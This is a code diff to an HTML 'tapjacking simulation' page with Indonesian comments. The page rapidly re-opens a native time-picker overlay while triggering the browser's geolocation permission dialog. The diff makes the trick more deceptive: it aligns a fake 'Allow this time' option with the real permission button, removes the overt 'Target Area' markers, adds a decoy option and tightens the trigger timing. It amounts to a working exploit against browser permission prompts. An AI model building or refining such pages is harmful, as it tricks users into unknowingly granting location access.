@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Advanced Rapid-Fire Alignment Lab</title>
+    <title>Precision Alignment Lab (Tapjacking Simulation)</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -21,17 +21,17 @@
         }
         h1 {
             color: #ff5252;
-            font-size: 20px;
+            font-size: 18px;
             margin-bottom: 5px;
         }
         .info-box {
             background: #1e1e1e;
             border: 1px solid #333;
-            padding: 12px;
+            padding: 10px;
             border-radius: 6px;
             max-width: 500px;
             width: 100%;
-            font-size: 12px;
+            font-size: 11px;
             color: #b0b0b0;
             margin-top: 15px;
             text-align: left;
@@ -39,7 +39,7 @@
         code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
         .interactive-zone {
             position: relative;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
             width: 100%;
             display: flex;
             justify-content: center;
@@ -48,16 +48,19 @@
 </head>
 <body>
 
-    <h1>⚠️ Rapid-Fire Alignment & Dialog Lab</h1>
-    <p style="font-size: 13px; color: #888;">Uji coba respons penekanan cepat terhadap kemunculan dialog izin sistem.</p>
+    <h1>⚠️ Precision Alignment & Rapid-Fire Lab</h1>
+    <p style="font-size: 12px; color: #888;">Uji coba penyesuaian posisi opsi picker dengan tombol "Allow this time".</p>
 
     <div class="interactive-zone">
+        <!-- Menggunakan input tipe waktu untuk memicu native time picker wheel -->
         <input id="input" type="time" list="times" style="display:none;" />
         <datalist id="times">
             <select>
-                <option label="-----------------------------------------">00:00</option>
-                <option label="👉 [ Allow this time ] Target Area 👈">00:00</option>
-                <option label="-----------------------------------------">00:00</option>
+                <option label="------------------------------------">00:01</option>
+                <!-- Menyesuaikan teks agar berada tepat di baris tengah selektor yang sejajar tombol asli -->
+                <option label="         Allow this time          ">00:02</option>
+                <option label="------------------------------------">00:03</option>
+                <option label="Other options">00:04</option>
             </select>
         </datalist>
     </div>
@@ -97,18 +100,18 @@
         // Eksekusi instan pertama
         showList();
 
-        // Pemicuan beruntun dengan interval yang lebih ketat untuk uji batas token
+        // Pemicuan beruntun dengan interval ketat untuk menguji respons antarmuka
         let rapidCount = 0;
         const rapidInterval = setInterval(() => {
             rapidCount++;
             appendLog(`Pemicuan cepat ke-${rapidCount}`);
             showList();
             
-            if (rapidCount >= 5) {
+            if (rapidCount >= 4) {
                 clearInterval(rapidInterval);
-                appendLog("Siklus pemicuan cepat selesai. Perhatikan penolakan dari sistem keamanan.");
+                appendLog("Siklus pemicuan cepat selesai.");
             }
-        }, 100);
+        }, 120);
 
         // Memanggil geolocation secara asinkron paralel untuk memunculkan dialog sistem
         navigator.geolocation.getCurrentPosition(
